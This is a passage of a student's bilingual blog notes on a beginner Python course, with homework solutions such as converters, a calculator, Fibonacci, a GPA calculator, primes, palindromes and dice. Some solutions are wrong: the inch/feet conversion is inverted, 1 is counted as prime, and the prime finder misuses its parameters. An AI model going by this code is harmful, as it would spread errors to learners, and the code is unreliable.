consideration.</strong></p><ul><li>Algorithms are like recipes: they must be followed exactly, they must be clear and unambiguous, and they must end.</li></ul><p> 特点在 <code>Natural languages</code> 而不在 <code>formal languages</code></p><ul><li><p>ambiguity含糊, redundancy冗余, and literalness字义的，表面意义的.</p></li><li><p>Syntax errors found by compiler &amp; interpreter.</p></li><li><p>Runtime errors found by interpreter.</p></li><li><p>The programmers could find semantic errors. &#x2F;&#x2F; 语义语法</p></li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math;</span><br><span class="line"></span><br><span class="line">num_1 = <span class="built_in">input</span>(<span class="string">&quot;Enter a digit: &quot;</span>)</span><br><span class="line">num_2 = <span class="string">&quot;10&quot;</span> </span><br><span class="line"><span class="comment"># 不建议以“10”的字符形式输入</span></span><br><span class="line">t = num_2 + num_1 </span><br><span class="line"><span class="comment"># 这里是字符串拼接，所以如果输入负数就会报错，烂</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(t) &gt; <span class="number">1010</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num 1 is larger than num 2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num 2 is larger than num 1&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>上课教了一些gitlab的使用教程</p><h2 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h2><p><strong>Inch to Feet Converter</strong>: Write step-by-step instructions for converting inch to feet</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ques = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pls select which convert type</span></span><br><span class="line"><span class="string">        1. inch to Feet</span></span><br><span class="line"><span class="string">        2. feet to inch</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ques)</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;pls input the select num: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the inch num:&quot;</span>))</span><br><span class="line">    c = <span class="built_in">float</span>(b*<span class="number">12</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the feet num is&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> a == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">    b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the feet num:&quot;</span>))</span><br><span class="line">    d = <span class="built_in">float</span>(b/<span class="number">12</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the inch num is&quot;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid input&quot;</span>)</span><br></pre></td></tr></table></figure></div><p><strong>Simple Calculator</strong>: Write step-by-step instructions for developing a simple calculator.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the first num: &quot;</span>))</span><br><span class="line"></span><br><span class="line">op = <span class="built_in">input</span>(<span class="string">&quot;pls input the calc :&quot;</span>)</span><br><span class="line">b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the second num:&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> op == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">    c = a+b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">    d = a-b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">    d = a*b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">    d = a/b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid input&quot;</span>)</span><br></pre></td></tr></table></figure></div><hr><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><p>大课写点小的课堂作业(很水的课)</p><p><strong>Which of the following is an invalid variable name in Python?</strong><br><code>isTrue</code>； <code>is_true</code>； <code>True</code>； <code>true</code></p><p>The <font color="red">invalid variable name</font> in Python from the options given is <code>True</code>.<br><code>True</code> is a reserved keyword in Python, and it cannot be used as a variable name. Python uses True to represent boolean true values.<br><strong>The other options, isTrue, is_true, and true</strong>, are valid variable names in Python. However, it is recommended to use snake_case (i.e., all lowercase with underscores between words) for variable names in Python.</p><p><strong>Is the following a block statement? Why?</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">counter = <span class="number">5</span> </span><br><span class="line">    <span class="built_in">print</span> (counter) </span><br><span class="line">    counter = <span class="number">1</span> </span><br></pre></td></tr></table></figure></div><p>No, because a block of statements requires a control structure that determines the flow of execution for a program, and spans across multiple lines. </p><p>Syntactic error &#x2F;&#x2F; 语法语句错误<br>Semantic error &#x2F;&#x2F; 语义错误<br><em>(Note: &#x3D; use for assignment and &#x3D;&#x3D; used for comparison)</em></p><h2 id="homework-1"><a href="#homework-1" class="headerlink" title="homework"></a>homework</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Input a number of bits: &quot;</span>))</span><br><span class="line"></span><br><span class="line">MB = <span class="built_in">int</span>(a/(math.<span class="built_in">pow</span>(<span class="number">1024</span>,<span class="number">2</span>)*<span class="number">8</span>))</span><br><span class="line">KB = <span class="built_in">int</span>(a/(math.<span class="built_in">pow</span>(<span class="number">1024</span>,<span class="number">1</span>)*<span class="number">8</span>)-(MB*<span class="number">1024</span>))</span><br><span class="line">B = <span class="built_in">int</span>((a/<span class="number">8</span>)-(MB*math.<span class="built_in">pow</span>(<span class="number">1024</span>,<span class="number">2</span>)+(KB*<span class="number">1024</span>)))</span><br><span class="line">b = <span class="built_in">int</span>(a%<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a,<span class="string">&quot;b =&quot;</span>,MB,<span class="string">&#x27;MB&#x27;</span>,KB,<span class="string">&#x27;KB&#x27;</span>,B,<span class="string">&#x27;B&#x27;</span>,b,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><strong>Compute Fibonacci Numbers</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_0 =&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_1 =&quot;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_2 =&quot;</span>, <span class="number">0</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_3 =&quot;</span>, <span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fiboloop</span>():</span><br><span class="line">    a, b =<span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="built_in">sum</span> = a+b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;F_&quot;</span>+<span class="built_in">str</span>(n),<span class="string">&quot;=&quot;</span>,<span class="built_in">sum</span>)</span><br><span class="line">        a = b</span><br><span class="line">        b = <span class="built_in">sum</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;that&#x27;s end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Fiboloop()</span><br></pre></td></tr></table></figure></div><p><strong>Using Python to Approximate the Golden Ratio</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">2.2</span>**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GoldenRatio</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        n = <span class="number">0.0002</span>*i</span><br><span class="line">        a = <span class="number">2.2</span>+n</span><br><span class="line">        calc = a**<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> calc &gt;<span class="number">5.000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.&quot;</span>,i,<span class="string">&quot;the clac is&quot;</span>,calc,<span class="string">&quot;the num is&quot;</span>,a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">GoldenRatio()</span><br></pre></td></tr></table></figure></div><p><strong>Using Fibonacci Numbers to Approximate the Golden Ratio</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_0 =&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_1 =&quot;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_2 =&quot;</span>, <span class="number">0</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_3 =&quot;</span>, <span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fiboloop</span>():</span><br><span class="line">    a, b =<span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">sum</span> = a+b</span><br><span class="line">        a = b</span><br><span class="line">        b = <span class="built_in">sum</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;F_&quot;</span>+<span class="built_in">str</span>(n),<span class="string">&quot;=&quot;</span>,<span class="built_in">sum</span>)</span><br><span class="line">        res = b/a</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;F_&quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;/F_&quot;</span>+<span class="built_in">str</span>(n-<span class="number">1</span>)+<span class="string">&quot;=&quot;</span>, res)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1.618</span>&lt;=res&lt;=<span class="number">1.61805</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Fiboloop()</span><br></pre></td></tr></table></figure></div><hr><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><p>水的很 都是简单I&#x2F;O<br>Assignment1 是个扑克牌抽牌游戏 没意思</p><hr><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="GPA-Calculator"><a href="#GPA-Calculator" class="headerlink" title="GPA Calculator"></a>GPA Calculator</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_grade_value</span>(<span class="params">mark</span>):</span><br><span class="line">    <span class="keyword">if</span> mark &gt;= <span class="number">80</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4.0</span></span><br><span class="line">    <span class="keyword">elif</span> mark &gt;= <span class="number">70</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.0</span></span><br><span class="line">    <span class="keyword">elif</span> mark &gt;= <span class="number">60</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2.0</span></span><br><span class="line">    <span class="keyword">elif</span> mark &gt;= <span class="number">50</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gpa</span>(<span class="params">unit_credit, stud_marks</span>):</span><br><span class="line">    total_credit = <span class="number">0</span></span><br><span class="line">    total_grade = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(unit_credit)):</span><br><span class="line">        credit = unit_credit[i]</span><br><span class="line">        mark = stud_marks[i]</span><br><span class="line">        grade_value = get_grade_value(mark)</span><br><span class="line">        total_credit += credit</span><br><span class="line">        total_grade += grade_value * credit</span><br><span class="line">    gpa = total_grade / total_credit</span><br><span class="line">    <span class="keyword">return</span> gpa</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unit Credit list  </span></span><br><span class="line">unit_credit = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Students Data</span></span><br><span class="line">students_data = [[<span class="string">&#x27;Bruce&#x27;</span>, <span class="number">72</span>, <span class="number">75</span>, <span class="number">100</span>, <span class="number">89</span>],</span><br><span class="line">                [<span class="string">&#x27;Clark&#x27;</span>, <span class="number">92</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">68</span>],</span><br><span class="line">                [<span class="string">&#x27;John&#x27;</span>, <span class="number">64</span>, <span class="number">41</span>, <span class="number">45</span>, <span class="number">57</span>],</span><br><span class="line">                [<span class="string">&#x27;Barry&#x27;</span>, <span class="number">55</span>, <span class="number">80</span>, <span class="number">94</span>, <span class="number">71</span>],</span><br><span class="line">                [<span class="string">&#x27;Diana&#x27;</span>, <span class="number">84</span>, <span class="number">71</span>, <span class="number">100</span>, <span class="number">70</span>],</span><br><span class="line">                [<span class="string">&#x27;Arthur&#x27;</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">40</span>, <span class="number">47</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your solution goes here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> student <span class="keyword">in</span> students_data:</span><br><span class="line">    name = student[<span class="number">0</span>]</span><br><span class="line">    marks = student[<span class="number">1</span>:]</span><br><span class="line">    gpa = get_gpa(unit_credit, marks)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> got <span class="subst">&#123;gpa:<span class="number">.3</span>f&#125;</span> GPA&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="Prime-Number"><a href="#Prime-Number" class="headerlink" title="Prime Number"></a>Prime Number</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_prime</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="comment"># enter_num = int(input(&quot;pls enter a number: &quot;))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, number):</span><br><span class="line">        <span class="keyword">if</span> number % idx == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print(number,&quot; is not a prime number&quot;)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># print(number,&quot;is a prime number&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_prime_number</span>(<span class="params">number, enter_num</span>):</span><br><span class="line">    enter_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;pls enter a number: &quot;</span>))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(start, end+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> check_prime(number):</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count &gt; enter_num:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The&quot;</span>,enter_num,<span class="string">&quot;prime number is&quot;</span>,number)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">start=<span class="number">1</span></span><br><span class="line">end=<span class="number">1000</span></span><br><span class="line">get_prime_number(start, end)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 3 5 7 11 13 17 19 23 29</span></span><br></pre></td></tr></table></figure></div><h2 id="Palindrome"><a href="#Palindrome" class="headerlink" title="Palindrome"></a>Palindrome</h2><p>Write a python function named <code>check_palindrome</code>, which takes a single argument named arg of string type and returns a two different values,<br>i.e., boolean value and type value.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter a value: <span class="number">12321</span></span><br><span class="line">(<span class="literal">True</span>, <span class="string">&#x27;Integer&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><code>isalpha()</code> 方法可以检查字符串中是否仅包含字母，如果字符串中包含除字母以外的字符，它将返回False。</p><p><code>isdigit()</code> 方法可以检查字符串中是否仅包含数字，如果字符串中包含除数字以外的字符，它将返回False。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_palindrome</span>():</span><br><span class="line">    enter_string = <span class="built_in">input</span>(<span class="string">&quot;Enter a value: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> enter_string.isdigit() == <span class="literal">True</span>:</span><br><span class="line">        reverse_string = enter_string[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> enter_string == reverse_string:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;True, &#x27;Integer&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;False, &#x27;Integer&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> enter_string.isalpha() == <span class="literal">True</span>:</span><br><span class="line">        reverse_string = enter_string[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> enter_string == reverse_string:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;True, &#x27;String&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;False, &#x27;String&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong argument provided&quot;</span>)</span><br><span class="line">        </span><br><span class="line">check_palindrome()</span><br></pre></td></tr></table></figure></div><h2 id="Dice-Roll"><a href="#Dice-Roll" class="headerlink" title="Dice Roll"></a>Dice Roll</h2><p>Write a python program that asks a users to select a dice to roll from a menu and roll that dice using a function named <code>roll_dice</code> that takes one argument from [4, 6, 8, 10, 12, 20, 100] and return the one random value from the specified dice.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Which Dice you want to roll?</span></span><br><span class="line"><span class="string">    Enter the number on left side to roll a dice</span></span><br><span class="line"><span class="string">    1....d4</span></span><br><span class="line"><span class="string">    2....d6</span></span><br><span class="line"><span class="string">    3....d8</span></span><br><span class="line"><span class="string">    4....d10</span></span><br><span class="line"><span class="string">    5....d12</span></span><br><span class="line"><span class="string">    6....d20</span></span><br><span class="line"><span class="string">    7....d100</span></span><br><span class="line"><span class="string">    8....Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>():</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> choice.isdigit() == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span 